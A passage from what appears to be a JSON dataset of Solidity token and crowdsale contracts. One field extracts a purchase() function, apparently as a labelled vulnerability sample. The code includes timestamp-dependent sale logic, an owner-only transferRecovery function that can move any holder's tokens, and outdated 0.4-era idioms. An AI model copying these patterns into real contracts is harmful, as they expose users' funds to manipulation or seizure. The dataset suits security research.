emit Transfer(msg.sender, address(0), amount);\n }\n function splitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 increaseSupplyBy = ownerBalance.mul(splitFactor).sub(ownerBalance);\n balances[msg.sender] = balances[msg.sender].mul(splitFactor);\n totalSupply_ = totalSupply_.mul(splitFactor);\n emit Transfer(address(0), msg.sender, increaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred * int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 multiplier = memberBalance.mul(splitFactor);\n currentMember.tokenBalance[j] = multiplier;\n }\n }\n n = nextGroupNumber;\n require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.mul(splitFactor);\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 decreaseSupplyBy = ownerBalance.sub(ownerBalance.div(splitFactor));\n totalSupply_ = totalSupply_.div(splitFactor);\n balances[msg.sender] = ownerBalance.div(splitFactor);\n emit Transfer(msg.sender, address(0), decreaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred / int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 divier = memberBalance.div(splitFactor);\n currentMember.tokenBalance[j] = divier;\n }\n }\n n = nextGroupNumber;\n require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.div(splitFactor);\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function splitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n splitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 multiplier1 = memberBalance.mul(splitFactor);\n uint256 increaseMemberSupplyBy = multiplier1.sub(memberBalance);\n balances[currentMember] = multiplier1;\n emit Transfer(address(0), currentMember, increaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 multiplier2 = nonMemberBalance.mul(splitFactor);\n uint256 increaseNonMemberSupplyBy = multiplier2.sub(nonMemberBalance);\n balances[currentNonMember] = multiplier2;\n emit Transfer(address(0), currentNonMember, increaseNonMemberSupplyBy);\n }\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n reverseSplitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 divier1 = memberBalance.div(splitFactor);\n uint256 decreaseMemberSupplyBy = memberBalance.sub(divier1);\n balances[currentMember] = divier1;\n emit Transfer(currentMember, address(0), decreaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 divier2 = nonMemberBalance.div(splitFactor);\n uint256 decreaseNonMemberSupplyBy = nonMemberBalance.sub(divier2);\n balances[currentNonMember] = divier2;\n emit Transfer(currentNonMember, address(0), decreaseNonMemberSupplyBy);\n }\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[msg.sender];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && msg.sender != owner) {\n bool fromTransferee = nonMemberTransfers[msg.sender];\n if (!fromTransferee) {\n nonMemberTransfers[msg.sender] = true;\n allNonMembers.push(msg.sender);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && _from != owner) {\n bool fromTransferee = nonMemberTransfers[_from];\n if (!fromTransferee) {\n nonMemberTransfers[_from] = true;\n allNonMembers.push(_from);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transferFrom(_from, _to, _value);\n }\n function setOpenGroup(uint256 groupNumber) public onlyOwner returns (bool success) {\n require(groupNumber < nextGroupNumber);\n openGroupNumber = groupNumber;\n return true;\n }\n function getUndistributedBalanceOf(address walletAddress, uint256 groupNumber) public view returns (uint256 balance) {\n Member storage theMember = members[walletAddress];\n require(theMember.exists);\n if (groups[groupNumber].distributed)\n return 0;\n return theMember.tokenBalance[groupNumber];\n }\n function checkMyUndistributedBalance(uint256 groupNumber) public view returns (uint256 balance) {\n return getUndistributedBalanceOf(msg.sender, groupNumber);\n }\n function transferRecovery(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) {\n allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 oldTransferred = fromMember.transferred;\n fromMember.transferred -= int(_value);\n require(oldTransferred >= fromMember.transferred);\n }\n return transferFrom(_from, _to, _value);\n }\n}",
  "extract_feature": [
    "function purchase() public canPurchase payable returns(bool success) {\nrequire(msg.sender != address(0));\nMember storage memberRecord = members[msg.sender];\nGroup storage openGroup = groups[openGroupNumber];\nrequire(openGroup.ratio > 0);\nuint256 currentTimestamp = block.timestamp;\nrequire(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\nrequire(!openGroup.distributing && !openGroup.distributed);\nrequire(tx.gasprice <= maxGasPrice);\nuint256 weiAmount = msg.value;\nrequire(weiAmount >= 0.1 ether);\nuint256 weiTotal = openGroup.weiTotal.add(weiAmount);\nrequire(weiTotal <= openGroup.cap);\nuint256 userWeiTotal = memberRecord.weiBalance[openGroupNumber].add(weiAmount);\nif(currentTimestamp <= openGroup.phase1endTime){\nemit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, true);\nreturn true;\n} else if (currentTimestamp <= openGroup.phase2endTime) {\nrequire(userWeiTotal <= openGroup.max2);\nemit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);\nreturn true;\n} else {\nrequire(userWeiTotal <= openGroup.max3);\nemit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);\nreturn true;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f12"
  },
  "filename": "6403.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && 